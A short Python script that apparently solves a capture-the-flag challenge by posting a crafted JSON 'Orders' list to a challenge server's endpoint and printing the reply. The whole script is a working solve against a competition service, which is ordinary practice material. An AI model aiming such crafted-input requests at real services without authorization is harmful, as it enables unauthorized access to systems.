import json

import requests

r = requests.post('http://readme.chal.idek.team:1337/just-read-it', data=json.dumps({'Orders': [100, 100, 100, 99, 99, 99, 40]}).encode())
print(r.content)